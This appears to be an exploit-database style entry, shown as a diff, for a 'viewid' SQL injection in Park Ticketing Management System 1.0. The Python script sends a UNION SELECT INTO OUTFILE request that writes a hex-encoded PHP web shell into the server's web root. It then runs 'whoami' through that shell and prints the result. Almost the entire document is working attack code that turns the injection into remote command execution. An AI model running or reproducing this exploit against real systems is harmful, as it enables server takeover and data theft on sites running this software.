@@ -1,0 +1,50 @@
+# Exploit Title: Park Ticketing Management System 1.0  - 'viewid' SQL Injection
+# Date: 2020-07-13
+# Exploit Author: gh1mau
+# Team Members: Capt'N,muzzo,chaos689 | https://h0fclanmalaysia.wordpress.com/
+# Vendor Homepage: https://phpgurukul.com/park-ticketing-management-system-using-php-and-mysql/
+# Software Link: https://phpgurukul.com/?smd_process_download=1&download_id=10952
+# Version: V1.0
+# Tested on: PHP 5.6.18, Apache/2.4.18 (Win32), Ver 14.14 Distrib 5.7.11, for Win32 (AMD64)
+
+
+
+import requests
+#this script is for POC purpose, you could add your own error checking mechanism
+command = "whoami"
+url = "http://localhost:80/ptms/view-normal-ticket.php?viewid=1%27%20UNION%20ALL%20SELECT%200x3c3f7068702073797374656d28245f524551554553545b276768316d6175275d293b203f3e,NULL,NULL,NULL,NULL,NULL,NULL%20INTO%20OUTFILE%20%27C:/UwAmp/www/ptms/1.php%27--%20-"
+
+payload = ""
+headers = {
+    "Cookie": "PHPSESSID=eabmes4rt7uger0dlqsljitjd6", 
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0", 
+    "Connection": "close", 
+    "Host": "localhost", 
+    "Accept-Encoding": "gzip, deflate", 
+    "Upgrade-Insecure-Requests": "1", 
+    "Accept-Language": "en-US,en;q=0.5"
+}
+
+response = requests.request("GET", url, data=payload, headers=headers)
+
+print("[+] Injecting Web Shell...\n")
+
+url2 = "http://localhost:80/ptms/1.php?gh1mau=" + command
+
+payload2 = ""
+headers2 = {
+    "Cookie": "PHPSESSID=eabmes4rt7uger0dlqsljitjd6", 
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0", 
+    "Connection": "close", 
+    "Host": "localhost", 
+    "Accept-Encoding": "gzip, deflate", 
+    "Upgrade-Insecure-Requests": "1", 
+    "Accept-Language": "en-US,en;q=0.5"
+}
+
+response2 = requests.request("GET", url2, data=payload2, headers=headers2)
+
+print("Web Shell: " + url2)
+print(response2.text)
